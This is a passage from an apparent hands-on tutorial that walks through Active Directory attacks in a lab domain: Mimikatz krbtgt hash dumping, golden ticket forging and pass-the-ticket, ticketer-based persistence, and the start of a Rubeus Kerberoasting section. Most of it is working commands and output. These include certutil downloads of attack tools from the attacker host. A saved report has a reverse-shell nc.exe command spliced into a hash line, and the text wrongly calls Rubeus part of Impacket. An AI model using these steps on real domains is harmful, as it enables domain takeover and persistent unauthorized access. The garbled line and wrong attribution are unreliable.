- Bloodhound
- neo4j
- Mimikatz

## Method 1: .kirib file

- - -

First, we will need to connect with `psexec.py` or `evil-winrm` to a user. I will connect to `sromero`:

```zsh
❯ psexec.py ruycr4ft.local/sromero:Password123@192.168.0.115 cmd.exe
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.0.115.....
[*] Found writable share ADMIN$
[*] Uploading file rUVzgArK.exe
[*] Opening SVCManager on 192.168.0.115.....
[*] Creating service DRyl on 192.168.0.115.....
[*] Starting service DRyl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd C:\Windows\Temp

C:\Windows\Temp> mkdir GDTicket

C:\Windows\Temp> cd GDTicket

C:\Windows\Temp\GDTicket> 
```

Now, in our attacker machine, we will locate the tool `mimikatz`:

```zsh
❯ locate mimikatz.exe
/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
/usr/share/windows-resources/mimikatz/x64/mimikatz.exe

❯ cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
```

Now, to successfully upload the file into we will need to create a python web server and then download `mimikatz.exe` into the machine:

```zsh
❯ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

```zsh
C:\Windows\Temp\GDTicket> certutil.exe -urlcache -f -split http://192.168.0.106:8080/mimikatz.exe
****  Online  ****
  000000  ...
  14ae00
CertUtil: -URLCache command completed successfully.

C:\Windows\Temp\GDTicket> 
```

Great! Now we have `mimikatz.exe` in the target machine.
> **Note:**I was having some problems with the session with `psexec.py` so I decided to connect via `evil-winrm`.

```zsh
*Evil-WinRM* PS C:\Windows\Temp\GDTicket> ls


    Directory: C:\Windows\Temp\GDTicket


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/25/2023  11:26 AM        1355264 mimikatz.exe


*Evil-WinRM* PS C:\Windows\Temp\GDTicket> 
```
After that we will need to execute mimikatz:

```zsh
c:\Users\sromero\Documents> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # lsadump::lsa /inject /name:krbtgt
Domain : RUYCR4FT / S-1-5-21-1320512025-754860945-2616689224

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : acf2d0133c0db165efbca5b44072e10a
    LM   : 
  Hash NTLM: acf2d0133c0db165efbca5b44072e10a
    ntlm- 0: acf2d0133c0db165efbca5b44072e10a
    lm  - 0: 7c43f505c7c846fd717111b40314bed9

 * WDigest
    01  becd6e5b902001e4311b7bdbfc616031
    02  7587f91c21753f6fbe9eb8b8da365e6b
    03  71d8c305785dc975c00293292408192d
    04  becd6e5b902001e4311b7bdbfc616031
    05  7587f91c21753f6fbe9eb8b8da365e6b
    06  8979ba2d3ed2899b51e913dbf0589aa0
    07  becd6e5b902001e4311b7bdbfc616031
    08  aa5360f6ebc9404ec9467eee12cff14f
    09  aa5360f6ebc9404ec9467eee12cff14f
    10  6cae5c036d13230cc1c4e9475458b2c2
    11  f8c169dbb3cd7fe2e9ca3b40496234d9
    12  aa5360f6ebc9404ec9467eee12cff14f
    13  a1c5d888375231016315508851f5fa22
    14  f8c169dbb3cd7fe2e9ca3b40496234d9
    15  cabd6d44d9d044557f2a70876b33ddd2
    16  cabd6d44d9d044557f2a70876b33ddd2
    17  fd87e62f461e64a2eac2f0407d6303d1
    18  da9e6811c137a7879777a7edd60ef7e2
    19  400a9a0b7f78941171b49dcc80565631
    20  11cc87b72975c480ca7878f24afb9a0a
    21  583a2c5907503eac51c296a449e6babd
    22  583a2c5907503eac51c296a449e6babd
    23  1eec8adf97193c62284290a9047eb4c2
    24  f647307f7fc269babc29ed18c4345395
    25  f647307f7fc269babc29ed18c4345395
    26  2a3eec21d946168baf578861e808c48f
    27  483f4565111d3a09f4d782cb45ab8e88
    28  b5485e3d693914153709f0be58292012
    29  d5ed6cf3ae96c0e19ed63e48d3d069b4

 * Kerberos
    Default Salt : RUYCR4FT.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 08232331ec589885

 * Kerberos-Newer-Keys
    Default Salt : RUYCR4FT.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : e890d33a55364e1c8c745308026e6703196558965d334fdd10f51ad8cf597a8d
      aes128_hmac       (4096) : ea6d7106e9a6b25147f1eed37ce4fe9e
      des_cbc_md5       (4096) : 08232331ec589885

 * NTLM-Strong-NTOWF
    Random Value : b6ed8da91bfbf1ea3ff3314d069ebb1c
mimikatz #
```

Now, save the report. It should look like this:

```plaintext
   1   │ lsadump::lsa /inject /name:krbtgt
   2   │ mimikatz # Domain : RUYCR4FT / S-1-5-21-1320512025-754860945-2616689224
   3   │ 
   4   │ RID  : 000001f6 (502)
   5   │ User : krbtgt
   6   │ 
   7   │  * Primary
   8   │     NTLM : acf2d0133c0db165efbca5b44072e10a
   9   │     LM   : 
  10   │   Hash NTLM: acf2d0133c0db165efbca5b44072e10a
  11   │     ntlm- 0: acf2d0133c0db165efbca5b44072e10a
  12   │     lm  - 0: 7c43f505c7c846fd717111b40314bed9
  13   │ 
  14   │  * WDigest
  15   │     01  becd6e5b902001e4311b7bdbfc616031
  16   │     02  7587f91c21753f6fbe9eb8b8da365e6b
  17   │     03  71d8c305785dc975c00293292408192d.\nc.exe 192.168.0.106 4848 -e powershell
  18   │     04  becd6e5b902001e4311b7bdbfc616031
  19   │     05  7587f91c21753f6fbe9eb8b8da365e6b
  20   │     06  8979ba2d3ed2899b51e913dbf0589aa0
  21   │     07  becd6e5b902001e4311b7bdbfc616031
  22   │     08  aa5360f6ebc9404ec9467eee12cff14f
  23   │     09  aa5360f6ebc9404ec9467eee12cff14f
  24   │     10  6cae5c036d13230cc1c4e9475458b2c2
  25   │     11  f8c169dbb3cd7fe2e9ca3b40496234d9
  26   │     12  aa5360f6ebc9404ec9467eee12cff14f
  27   │     13  a1c5d888375231016315508851f5fa22
  28   │     14  f8c169dbb3cd7fe2e9ca3b40496234d9
  29   │     15  cabd6d44d9d044557f2a70876b33ddd2
  30   │     16  cabd6d44d9d044557f2a70876b33ddd2
  31   │     17  fd87e62f461e64a2eac2f0407d6303d1
  32   │     18  da9e6811c137a7879777a7edd60ef7e2
  33   │     19  400a9a0b7f78941171b49dcc80565631
  34   │     20  11cc87b72975c480ca7878f24afb9a0a
  35   │     21  583a2c5907503eac51c296a449e6babd
  36   │     22  583a2c5907503eac51c296a449e6babd
  37   │     23  1eec8adf97193c62284290a9047eb4c2
  38   │     24  f647307f7fc269babc29ed18c4345395
  39   │     25  f647307f7fc269babc29ed18c4345395
  40   │     26  2a3eec21d946168baf578861e808c48f
  41   │     27  483f4565111d3a09f4d782cb45ab8e88
  42   │     28  b5485e3d693914153709f0be58292012
  43   │     29  d5ed6cf3ae96c0e19ed63e48d3d069b4
  44   │ 
  45   │  * Kerberos
  46   │     Default Salt : RUYCR4FT.LOCALkrbtgt
  47   │     Credentials
  48   │       des_cbc_md5       : 08232331ec589885
  49   │ 
  50   │  * Kerberos-Newer-Keys
  51   │     Default Salt : RUYCR4FT.LOCALkrbtgt
  52   │     Default Iterations : 4096
  53   │     Credentials
  54   │       aes256_hmac       (4096) : e890d33a55364e1c8c745308026e6703196558965d334fdd10f51ad8cf597a8d
  55   │       aes128_hmac       (4096) : ea6d7106e9a6b25147f1eed37ce4fe9e
  56   │       des_cbc_md5       (4096) : 08232331ec589885
  57   │ 
  58   │  * NTLM-Strong-NTOWF
  59   │     Random Value : b6ed8da91bfbf1ea3ff3314d069ebb1c
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
(END)
```

Now, we need to input the next parameters:

```zsh
mimikatz # kerberos::golden /domain:ruycr4ft.local /sid:S-1-5-21-1320512025-754860945-2616689224 /rc4:acf2d0133c0db165efbca5b44072e10a /user:Administrator /ticket:golden.kirbi
User      : Administrator
Domain    : ruycr4ft.local (RUYCR4FT)
SID       : S-1-5-21-1320512025-754860945-2616689224
User Id   : 500
Groups Id : *513 512 520 518 519 
ServiceKey: acf2d0133c0db165efbca5b44072e10a - rc4_hmac_nt      
Lifetime  : 5/25/2023 11:54:50 AM ; 5/22/2033 11:54:50 AM ; 5/22/2033 11:54:50 AM
-> Ticket : golden.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

Don't worry, I am going to explain every parameter:
- `/domain` DC Domain
- `/sid` Is the krbtgt user ID
- `/rc4` Is the NTLM hash
- `/user` The user you want to impersonate
- `/ticket` The name of the ticket

With that command, we've been generated a `.kirbi` file:

```zsh
c:\Users\sromero\Documents> dir
 Volume in drive C has no label.
 Volume Serial Number is FE91-24FB

 Directory of c:\Users\sromero\Documents

05/25/2023  11:54 AM    <DIR>          .
05/25/2023  11:54 AM    <DIR>          ..
05/25/2023  11:54 AM             1,409 golden.kirbi
05/25/2023  11:39 AM         1,250,056 mimikatz.exe
               3 File(s)      1,255,734 bytes
               2 Dir(s)  13,660,475,392 bytes free

c:\Users\sromero\Documents> 
```

We want to have the `.kirbi` file in our attacker machine, so we'll need to follow this steps:

In the target machine, we'll execute this:

```zsh
*Evil-WinRM* PS C:\users\sromero\documents> download golden.kirbi
Info: Downloading golden.kirbi to ./golden.kirbi

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\users\sromero\documents> 
```

Great! Now we have the `golden.kirbi` file in our attacker machine!
Now, we can connect, for example, to `ramlux`'s machine. We are domain administrators, so we can put the IP we want and connect successfully:

```zsh
❯ psexec.py ruycr4ft.local/Administrator:P@\$\$w0rd\!@192.168.0.149 cmd.exe
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.0.149.....
[*] Found writable share ADMIN$
[*] Uploading file Rplbrtld.exe
[*] Opening SVCManager on 192.168.0.149.....
[*] Creating service zlVv on 192.168.0.149.....
[*] Starting service zlVv.....
[!] Press help for extra shell commands
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32>
```

If we try to list the files on `C$` as `ramlux` on the DC, we will get a `Access denied`:

```zsh
PS C:\Windows\Temp\test> dir \\WIN-FV8S9VU238J\C$
dir \\WIN-FV8S9VU238J\C$
dir : Acceso denegado
En lnea: 1 Carcter: 1
+ dir \\WIN-FV8S9VU238J\C$
+ ~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\WIN-FV8S9VU238J\C$:String) [Get-ChildItem], UnauthorizedAccessExcep 
   tion
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
 
dir : No se encuentra la ruta de acceso '\\WIN-FV8S9VU238J\C$' porque no existe.
En lnea: 1 Carcter: 1
+ dir \\WIN-FV8S9VU238J\C$
+ ~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (\\WIN-FV8S9VU238J\C$:String) [Get-ChildItem], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
 
PS C:\Windows\Temp\test> 
```

Here is where the `.kirbi`  starts to act.
Let's move to `C:\Windows\Temp\` and mkidr `test`. Now, we need to download `mimikatz` and `golden.kirbi` into the `ramlux` PC:

```zsh
PS C:\Windows\Temp\test> certutil.exe -urlcache -f -split http://192.168.0.106:8080/mimikatz.exe
certutil.exe -urlcache -f -split http://192.168.0.106:8080/mimikatz.exe
****  En lnea  ****
  000000  ...
  14ae00
CertUtil: -URLCache comando completado correctamente.
PS C:\Windows\Temp\test> certutil.exe -urlcache -f -split http://192.168.0.106:8080/golden.kirbi
certutil.exe -urlcache -f -split http://192.168.0.106:8080/golden.kirbi
****  En lnea  ****
  0000  ...
  0581
CertUtil: -URLCache comando completado correctamente.
PS C:\Windows\Temp\test> 
```

Now we are going to perform a `pass the ticket` attack:

```zsh
PS C:\Windows\Temp\test> ./mimikatz.exe
./mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # kerberos::ptt golden.kirbi

* File: 'golden.kirbi': OK

mimikatz # exit
Bye!
PS C:\Windows\Temp\test> dir \\192.168.0.115\c$
dir \\192.168.0.115\c$


    Directory: \\192.168.0.115\c$


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        11/5/2022  11:21 AM                PerfLogs                                                              
d-r---        5/23/2023   8:46 AM                Program Files                                                         
d-----        5/23/2023   8:46 AM                Program Files (x86)                                                   
d-r---        5/25/2023   8:37 AM                Users                                                                 
d-----        5/26/2023   8:49 AM                Windows                                                               


PS C:\Windows\Temp\test> 
```

Perfect!! This attack was successful!!

## Method 2: .ccache file

- - -

For this method we'll use the famous tool `ticketer`. This will allow us to gain access to the DC.

```zsh
❯ ticketer.py -nthash acf2d0133c0db165efbca5b44072e10a -domain-sid S-1-5-21-1320512025-754860945-2616689224 -domain ruycr4ft.local Administrator
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for ruycr4ft.local/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in Administrator.ccache
```

This command will authenticate with the `krbtgt` user and request a `.ccache` file of Administrator's cache:

```zsh
❯ ls
Administrator.ccache  golden.kirbi  mimikatz.exe  report
```

Now, to have **permanent** persistence on this DC, we need to export a variable called `KRB5CCNAME` equal to the `.ccache` file:

```zsh
❯ export KRB5CCNAME="/home/ruy/Escritorio/ActiveDirectory/GoldenTicket/Administrator.ccache"
```

After that, we'll check if the variable was exported successfully:

```zsh
❯ ls -l $KRB5CCNAME
-rw-r--r-- 1 root root 1185 may 26 18:05 /home/ruy/Escritorio/ActiveDirectory/GoldenTicket/Administrator.ccache
```

Perfect.
Now we need to modify the `krb5.conf` file 

![](/assets/img/AD/12.png)

Now, we can access the DC without password!

```zsh
❯ psexec.py -n -k ruycr4ft.local/Administrator@WIN-FV8S9VU238J cmd.exe
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.0.115.....
[*] Found writable share ADMIN$
[*] Uploading file AouVevOZ.exe
[*] Opening SVCManager on 192.168.0.115.....
[*] Creating service ehpS on 192.168.0.115.....
[*] Starting service ehpS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```

Perfect!!! 
> **Note:** It does't matter if the Administrator's password changes, you will have **permanent persistence on the DC**!!!

# Rubeus - Kerberoasting

- - -

The difference between regular Kerberoasting and Rubeus Kerberoasting lies in the tools used to perform the attack and the additional features provided by Rubeus.

Regular Kerberoasting typically refers to the general technique or concept of exploiting the vulnerability in Kerberos to extract and crack service account passwords. It involves identifying service accounts, requesting service tickets (TGS) for those accounts, and offline cracking of the encrypted service tickets to obtain the plaintext passwords. Regular Kerberoasting can be performed using various tools and scripts, or even manually.

On the other hand, Rubeus is a specific tool developed by Harmj0y as part of the Impacket framework. Rubeus is designed to assist in various Kerberos-related attacks, including Kerberoasting. It provides additional functionalities and features specifically aimed at simplifying and automating the Kerberoasting process. Some notable differences and advantages of Rubeus Kerberoasting include:

- Enhanced functionality: Rubeus provides built-in functionality for enumerating service accounts, requesting service tickets, and performing offline cracking. It simplifies the steps involved in the Kerberoasting attack process.

- Dictionary and brute force attacks: Rubeus supports both dictionary-based and brute force password cracking methods against the encrypted service tickets. It provides options for specifying custom wordlists and password complexity rules.

- Filtering options: Rubeus allows for filtering the service accounts based on various criteria, such as SPN name, account name, or specific user groups. This enables more targeted and efficient Kerberoasting attacks.

- Automation and scripting: Rubeus can be scripted and automated, allowing for batch processing of multiple service accounts. This can be especially useful when dealing with a large number of service accounts in the domain.

- Extended features: Rubeus offers additional features beyond Kerberoasting, such as ticket-grabbing, pass-the-ticket attacks, and Golden Ticket generation. These features make Rubeus a versatile tool for various Kerberos-related attacks.

- In summary, while regular Kerberoasting refers to the general technique of exploiting Kerberos vulnerabilities to crack service account passwords, Rubeus Kerberoasting specifically refers to using the Rubeus tool to automate and simplify the Kerberoasting process while providing additional features and flexibility.

## PoC

- - -

First, we'll need to locate `Rubeus` in our system and move it into our working directory:

```zsh
❯ locate Rubeus
/home/ruy/Escritorio/Rubeus-1.6.4.zip
/home/ruy/Escritorio/Rubeus.exe

❯ mv /home/ruy/Escritorio/Rubeus.exe .

❯ ls
192.168.0.149_samhashes.sam  BloodHound-linux-x64  document.pdf  hash     Invoke-RunasCs.ps1  mimikatz  nc.exe         PDF-Icon.ico  PS.ps1             rpcenum.sh  target   users
ADCSTemplate.psm1            Certify               GoldenTicket  ico.png  kerbrute            mitm6     ntlmrelayx.py  PDF-Icon.png  Reverse-Shell.ps1  Rubeus.exe  targets
```

If you don't find it, you can download it [here](https://github.com/GhostPack/Rubeus).

After that, we'll need to upload `Rubeus` to the DC:

```zsh
PS C:\Windows\Temp> certutil.exe -urlcache -f -split http://192.168.0.106/Rubeus.exe
certutil.exe -urlcache -f -split http://192.168.0.106/Rubeus.exe
****  Online  ****
  000000  ...
  06d200
CertUtil: -URLCache command completed successfully.
PS C:\Windows\Temp> 
```

Nice! 
The next step would be to look at the `help` manual:

```zsh
PS C:\Windows\Temp> ./Rubeus.exe
./Rubeus.exe

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


 Ticket requests and renewals:

    Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/oldsam] [/proxyurl:https://KDC_PROXY/kdcproxy]

    Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec] [/nopac] [/oldsam] [/proxyurl:https://KDC_PROXY/kdcproxy]

    Retrieve a TGT using a PCKS12 certificate, start a /netonly process, and to apply the ticket to the new process/logon session:
        Rubeus.exe asktgt /user:USER /certificate:C:\temp\leaked.pfx </password:STOREPASSWORD> /createnetonly:C:\Windows\System32\cmd.exe [/getcredentials] [/servicekey:KRBTGTKEY] [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy]

    Retrieve a TGT using a certificate from the users keystore (Smartcard) specifying certificate thumbprint or subject, start a /netonly process, and to apply the ticket to the new process/logon session:
        Rubeus.exe asktgt /user:USER /certificate:f063e6f4798af085946be6cd9d82ba3999c7ebac /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap]

    Request a TGT without sending pre-auth data:
        Rubeus.exe asktgt /user:USER [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy]

    Request a service ticket using an AS-REQ:
        Rubeus.exe asktgt /user:USER /service:SPN </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/oldsam] [/proxyurl:https://KDC_PROXY/kdcproxy]

    Retrieve a service ticket for one or more SPNs, optionally saving or applying the ticket:
        Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/enterprise] [/opsec] </tgs:BASE64 | /tgs:FILE.KIRBI> [/targetdomain] [/u2u] [/targetuser] [/servicekey:PASSWORDHASH] [/asrepkey:ASREPKEY] [/proxyurl:https://KDC_PROXY/kdcproxy]

    Renew a TGT, optionally applying the ticket, saving it, or auto-renewing the ticket up to its renew-till limit:
        Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/autorenew] [/nowrap]

    Perform a Kerberos-based password bruteforcing attack:
        Rubeus.exe brute </password:PASSWORD | /passwords:PASSWORDS_FILE> [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose] [/nowrap]

    Perform a scan for account that do not require pre-authentication:
        Rubeus.exe preauthscan /users:C:\temp\users.txt [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/proxyurl:https://KDC_PROXY/kdcproxy]


 Constrained delegation abuse:

    Perform S4U constrained delegation abuse:
        Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self] [/proxyurl:https://KDC_PROXY/kdcproxy]
        Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self] [/bronzebit] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy]

    Perform S4U constrained delegation abuse across domains:
        Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER /targetdomain:DOMAIN.LOCAL /targetdc:DC.DOMAIN.LOCAL [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/self] [/nopac]


 Ticket Forgery:

    Forge a golden ticket using LDAP to gather the relevent information:
        Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> /ldap [/printcmd] [outfile:FILENAME] [/ptt]

    Forge a golden ticket using LDAP to gather the relevent information but explicitly overriding some values:
        Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> /ldap [/dc:DOMAIN_CONTROLLER] [/domain:DOMAIN] [/netbios:NETBIOS_DOMAIN] [/sid:DOMAIN_SID] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/newpac] [/printcmd] [outfile:FILENAME] [/ptt]

    Forge a golden ticket, setting values explicitly:
        Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </domain:DOMAIN> </sid:DOMAIN_SID> [/dc:DOMAIN_CONTROLLER] [/netbios:NETBIOS_DOMAIN] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/newpac] [/printcmd] [outfile:FILENAME] [/ptt]

    Forge a silver ticket using LDAP to gather the relevent information:
        Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/printcmd] [outfile:FILENAME] [/ptt]

    Forge a silver ticket using LDAP to gather the relevent information, using the KRBTGT key to calculate the KDCChecksum and TicketChecksum:
        Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap </krbkey:HASH> [/krbenctype:DES|RC4|AES128|AES256] [/printcmd] [outfile:FILENAME] [/ptt]

    Forge a silver ticket using LDAP to gather the relevent information but explicitly overriding some values:
        Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/dc:DOMAIN_CONTROLLER] [/domain:DOMAIN] [/netbios:NETBIOS_DOMAIN] [/sid:DOMAIN_SID] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/authdata] [/printcmd] [outfile:FILENAME] [/ptt]

    Forge a silver ticket using LDAP to gather the relevent information and including an S4UDelegationInfo PAC section:
        Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/s4uproxytarget:TARGETSPN] [/s4utransitedservices:SPN1,SPN2,...] [/printcmd] [outfile:FILENAME] [/ptt]

    Forge a silver ticket using LDAP to gather the relevent information and setting a different cname and crealm:
        Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/cname:CLIENTNAME] [/crealm:CLIENTDOMAIN] [/printcmd] [outfile:FILENAME] [/ptt]

    Forge a silver ticket, setting values explicitly:
